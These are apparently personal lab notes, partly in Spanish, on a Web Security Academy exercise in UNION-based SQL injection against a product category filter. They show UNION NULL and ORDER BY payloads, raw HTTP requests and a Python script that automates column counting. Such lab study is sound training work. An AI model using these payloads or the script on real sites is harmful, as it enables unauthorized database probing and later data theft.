SQLi - Product category filter

End Goal: determine the number of columns returned by the query. 

Background (Union):

table1      table2
a | b       c | d 
-----       -----
1 , 2       2 , 3
3 , 4       4 , 5

Query #1: select a, b from table1
1,2
3,4

Query #2: select a, b from table1 UNION select c,d from table2
1,2
3,4
2,3
4,5

Rule: 
- The number and the order of the columns must be the same in all queries
- The data types must be compatible

SQLi attack (way #1):

select ? from table1 UNION select NULL
-error -> incorrect number of columns  # Si obtenemos error continuaremos agregando null a la query hasta que coincida con el numero de columnas de table1

select ? from table1 UNION select NULL, NULL, NULL
-200 response code -> correct number of columns

SQLi attack (way #2):

select a, b from table1 order by 3   # se va incrementando el numero hasta sobrepasar la cantidad de columnas y asi vemos la cantidad de columnas que tiene la tabla


Para comprobar le modificamos el parametro category

```
https://0a3c00d103385c3e81632afa007900a4.web-security-academy.net/filter?category=Corporate+gifts

#Modificado
https://0a3c00d103385c3e81632afa007900a4.web-security-academy.net/filter?category='

#Con este no nos da error pero no devuelve nada pues no es una categoria por lo cual reafiramos que es vulnerable
https://0a3c00d103385c3e81632afa007900a4.web-security-academy.net/filter?category='--

Si la pagina nos muestra un error es que es susectible a sql injection y en category insertaremos nuestra consulta
```

![[Pasted image 20250804222604.png]]

Primera prueba pasandole por parametro en Busrsuit le vamos agregando null hasta coincidir con la cantidad de columnas

```
GET /filter?category=Gifts'+UNION+select+NULL,+NULL,+NULL-- HTTP/2
```

Segunda prueba utilizando el orde by lo que hace es ordenar por la columna que le indiquemos es decir 1, 2, 3 ...

```
GET /filter?category=Gifts'+ORDER+BY+1-- HTTP/2
```

En el navegador no es necesario concatenar 
```
url/filter?category=Gifts' ORDER BY 1--
```

Cuando eccedemos el numero de columnas da un error pasa al poner 4 en una tabla de 3 columnas
![[Pasted image 20250804225808.png]]


Automatizar el proceso con Python
```
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_column_number(url):
    path = "filter?category=Gifts"
    for i in range(1,50):
        sql_payload = "'+order+by+%s--" %i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + "." )
    else:
        print("[-] The SQLi attack was not successful.")


```